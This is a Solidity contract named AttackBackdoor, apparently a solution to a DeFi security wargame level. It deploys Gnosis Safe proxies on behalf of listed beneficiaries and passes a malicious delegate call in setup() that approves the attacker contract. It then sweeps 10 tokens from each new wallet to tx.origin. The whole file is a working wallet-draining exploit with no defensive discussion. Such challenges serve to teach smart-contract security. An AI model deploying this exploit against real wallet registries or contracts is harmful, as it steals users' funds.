// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";

contract AttackBackdoor {
    GnosisSafeProxyFactory public factory;
    IProxyCreationCallback public callback;
    IERC20 public token;
    address[] public users;
    address public singleton;

    constructor(
        address _factory,
        address _callback,
        address _token,
        address[] memory _users,
        address _singleton  
        
    ) {
        factory = GnosisSafeProxyFactory(_factory);
        callback = IProxyCreationCallback(_callback);
        token = IERC20(_token);
        users = _users;
        singleton = _singleton; 
    }

    function attack() external {
        // Create ABI for approve() payload
        bytes memory data = abi.encodeWithSignature(
            "approve(address,address)",
            token,
            address(this)
        );

        // Create wallet for each beneficiary
        for (uint256 i = 0; i < users.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = users[i];

            // Create ABI for GnosisSafe setup()
            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)", // Function signature of setup(), must equal to GnosisSafe.setup.selector
                owners,         // Must be registered as beneficiaries
                1,              // Threshold must == 1
                address(this),  // Optional delegate call address
                data,           // Optional delegate call data
                address(token), // Specify the token as fallback handler
                address(0),     // PAyment token
                0,              // Payment
                address(0)      // Payment receiver
            );

            // Create a proxy and trigger fallback function
            GnosisSafeProxy proxy = factory.createProxyWithCallback(
                singleton,
                initializer,
                0,
                callback
            );

            // Transfer tokens
            IERC20 (token).transferFrom(address(proxy), tx.origin, 10 ether);
            }
    }

    // Approve token function for delegatecall
    function approve(address _token, address spender) public {
        IERC20(_token).approve(spender, 10 ether);
    }
}